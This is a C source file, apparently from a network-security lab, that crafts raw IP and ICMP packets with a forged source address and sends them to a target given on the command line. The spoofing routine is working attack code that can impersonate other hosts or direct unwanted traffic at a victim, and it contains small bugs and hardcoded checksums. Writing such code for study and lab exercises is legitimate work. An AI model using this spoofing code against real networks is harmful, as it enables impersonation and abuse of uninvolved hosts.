/* Must be root or SUID 0 to open RAW socket
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in_systm.h>
#include <string.h>
*/

#include "spoof.h"


//Source for seedheaders.h
/* ICMP  Header */






/****************************************************
  Calculate an internet checksum

*****************************************************/

unsigned short in_cksum (unsigned short *buf, int length)
{
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	/*
	 * The algorithm uses a 32 bit accumulator (sum) adds sequential 16 bit
         * words to it, and at the end, folds back all the carry bits from the
	 * top 16 bits into the lower 16 bits
	 */

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* treat the odd byte at the end, if any */
	if (nleft == 1) {
		*(u_char *) (&temp) = *(u_char *)w;
		sum += temp;
	}

	/* add back carry outs from top 16 to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16);		    // add carry
	return (unsigned short) (~sum);
}

/********************************************************************
  TCP checksum is calculated on the pseudo header, which includes
  the TCP header and data, plus some part of the IP header.  Therefore,
  we need to construct the pseudo header first
  ********************************************************************/

/* Pseudo TCP header */
struct pseudo_tcp
{
	unsigned saddr, daddr;
	unsigned char mbz;
	unsigned char ptcl;
	unsigned short tcpl;
	struct tcphdr tcp;
	char payload[1500];
};

unsigned short calculate_tcp_checksum(struct ipheader *ip){
	struct tcphdr *tcp = (struct tcphdr *) ((u_char *)ip + sizeof(struct ipheader));
	int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

	/* pseudo tcp header for checksum comp */
	struct pseudo_tcp p_tcp;
	memset (&p_tcp, 0x0, sizeof(struct pseudo_tcp));

	p_tcp.saddr = ip->iph_sourceip.s_addr;
	p_tcp.daddr = ip->iph_destip.s_addr;
	p_tcp.mbz = 0;
	p_tcp.ptcl = IPPROTO_TCP;
	p_tcp.tcpl = htons(tcp_len);
	memcpy(&p_tcp.tcp, tcp, tcp_len);

	return (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}



void send_raw_ip_packet(struct ipheader* ip){
	struct sockaddr_in dest_info;
	int enable = 1;

	// step 1: Create a raw network socket
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	// step 2: Set socket options
	setsockopt (sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	// step 3: Provided destination information
	dest_info.sin_family = AF_INET;  // internet protocol
	dest_info.sin_addr = ip->iph_destip;

	// step 4: Send the packet out
	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}
void tester(){
	printf("Testing\n\n 123 123 \n");
}

void finish_him(char* src, char* dest, int argc){

	char *argv[] = {"nothing", src,dest};

	/* Declare some stuff*/
	int s,i;
	char buf[400];
	struct ipheader *ip = (struct ipheader *)buf;
	struct icmpheader *icmp = (struct icmpheader *)(ip+1);
	struct hostent *hp, *hp2;
  	if(argc < 2)
  	{
    	printf("\nUsage: %s <saddress> <dstaddress> \n", argv[0]);
     	printf("- saddress is the spoofed source address\n");
    	printf("- dstaddress is the target\n");
     	exit(1);
   	}
	bzero(buf, sizeof(buf));
	if((hp = gethostbyname(argv[2])) == NULL)
       {
         if((ip->iph_destip.s_addr = inet_addr(argv[2])) == -1)
         {
            fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
            exit(1);
         }
       }else
	{
           bcopy(hp->h_addr_list[0], &ip->iph_destip.s_addr, hp->h_length);
	}

        /* The following source address just redundant for target to collect */
        if((hp2 = gethostbyname(argv[1])) == NULL)
        {
         if((ip->iph_sourceip.s_addr = inet_addr(argv[1])) == -1)
         {
             fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
             exit(1);
         }
        }else
	{
            bcopy(hp2->h_addr_list[0], &ip->iph_sourceip.s_addr, hp->h_length);
	}

        printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->iph_destip), argv[1]);


	

	// step 1: fill in the ICMP Header
	icmp->icmp_type = 0;
	icmp->icmp_code = 0;
	icmp->icmp_id = 0;
	icmp->icmp_seq = 20;
	icmp->icmp_chksum =0xffeb;// htons(~(8<<8));
	// calculate the checksum

	// step 2: fill in the IP header
	ip->iph_ihl = sizeof*ip >> 2;
	ip->iph_ver = 4;
	ip->iph_tos = 0;
	int ip_len = 400;
	ip->iph_len = htons(ip_len);
	printf("\nThe value of bu = %d \n ", ip_len);
	ip->iph_ident = htons(4321);
	ip->iph_offset = htons(0);
	ip->iph_flag = 0;
	ip->iph_ttl = 255;
	ip->iph_protocol = 1;
	ip->iph_chksum = 0x2219 ; //0;
	send_raw_ip_packet(ip);
	// step 3: send the packet



}
